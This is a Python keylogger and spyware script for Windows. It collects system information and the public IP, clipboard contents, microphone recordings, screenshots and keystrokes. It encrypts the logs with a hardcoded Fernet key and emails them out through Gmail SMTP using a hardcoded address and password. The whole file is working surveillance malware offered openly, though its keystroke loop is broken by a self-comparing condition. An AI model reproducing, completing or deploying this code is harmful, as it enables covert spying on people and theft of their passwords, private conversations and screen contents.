#Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


#Variables
keys_information = "key_log.txt"
system_information = "system_info.txt"
email_address = "aliciastephens247@gmail.com"
password = "P@ssw0rd1998"
toaddr = "aliciastephens247@gmail.com"
clipboard_information = "clipboard.txt"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
time_iteration = 15
number_of_iterations = 3
keys_information_e = "e_key_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"
key = "bzsl_U4-VYh799pK5fJSzMW91hmLMB3CxhX_FGugIk8="
count = 0
 

file_path = "I:\\Keylogger"
extend = "\\"
file_merge = file_path+extend

#Functions
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr,  toaddr, text)
    s.quit()



def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: "+ public_ip)

        except Exception:
            f.write("Couldn't get public IP address (most likely max query)")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System"+ platform.system()+ " "+ platform.version()+ '\n')
        f.write("Machine: "+ platform.machine()+ '\n')
        f.write("Hostname: "+ hostname + '\n')        
        f.write("Private IP Address: "+ IPAddr + '\n')

computer_information()

def copy_clipboard():
    with open(file_path+extend+clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n "+ pasted_data)

        except Exception:
            f.write("Clipboard could not be copied")

copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording =  sd.rec(seconds * fs, channels=2)
    sd.wait()
    write(file_path+extend+audio_information, fs, myrecording)


microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+ extend + screenshot_information)



screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


while number_of_iterations < number_of_iterations:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1 
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []




    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()

                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime> stoppingTime:

        with open(file_path+extend+keys_information, 'w') as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path+extend+screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time + time_iteration


files_to_encrypt = [file_merge+system_information, file_merge+clipboard_information, file_merge+keys_information]
encrypted_file_names = [file_merge+system_information_e, file_merge+clipboard_information_e, file_merge+keys_information_e]

for encrypting_file in files_to_encrypt:
    
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)